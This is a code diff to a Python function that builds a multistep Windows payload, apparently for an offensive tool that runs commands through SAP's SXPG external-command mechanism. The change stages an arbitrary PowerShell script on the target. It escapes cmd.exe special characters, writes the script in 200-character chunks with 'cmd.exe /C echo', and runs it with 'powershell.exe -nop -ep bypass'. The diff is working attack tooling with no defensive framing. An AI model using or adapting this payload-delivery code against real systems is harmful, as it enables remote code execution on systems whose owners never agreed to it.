@@ -405,34 +405,35 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
                f"[Convert]::FromBase64String($b)))\"")
     assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
 
-    # SXPG path: ASCII Base64 (certutil decodes to plain ASCII .ps1).
-    # No UTF-16LE — certutil output has no BOM, old PS reads as ANSI.
-    enc_ascii = base64.b64encode(
-        ps_script.encode("ascii")).decode("ascii")
-    sxpg_chunks = [enc_ascii[i:i+chunk_size]
-                   for i in range(0, len(enc_ascii), chunk_size)]
+    # SXPG path: write PS1 directly using cmd.exe echo.
+    # Escape cmd.exe special chars: & | < > ( ) ^ with ^
+    escaped = ps_script
+    for ch in ("^", "&", "|", "<", ">", "(", ")"):
+        escaped = escaped.replace(ch, f"^{ch}")
+    # Split into chunks that fit in PARAMS (255 chars).
+    # "cmd.exe" EXTPROG + "/C echo CHUNK>>path" PARAMS
+    # Overhead: "/C echo >>" + path = ~30 chars
+    ps_chunk_size = 200
+    ps_chunks = [escaped[i:i+ps_chunk_size]
+                 for i in range(0, len(escaped), ps_chunk_size)]
+    ps1_file = f"{tmp}.ps1"
     sxpg_steps = [
-        # Clean up old files first
         {"command": "cmd.exe",
-         "params": f"/C del /q {tmp} {tmp}.ps1 2>nul"},
+         "params": f"/C del /q {ps1_file} 2>nul"},
     ]
-    for idx, chunk in enumerate(sxpg_chunks):
+    for idx, chunk in enumerate(ps_chunks):
         redir = ">" if idx == 0 else ">>"
         sxpg_steps.append({
             "command": "cmd.exe",
-            "params": f"/C echo {chunk}{redir}{tmp}",
+            "params": f"/C echo {chunk}{redir}{ps1_file}",
         })
-    sxpg_steps.append({
-        "command": "certutil.exe",
-        "params": f"-decode {tmp} {tmp}.ps1",
-    })
     return {
         "steps": steps,
         "command": run_cmd,
         "params": "",
         "sxpg_steps": sxpg_steps,
         "sxpg_command": "powershell.exe",
-        "sxpg_params": f"-nop -ep bypass -f {tmp}.ps1",
+        "sxpg_params": f"-nop -ep bypass -f {ps1_file}",
         "display": display,
     }
 
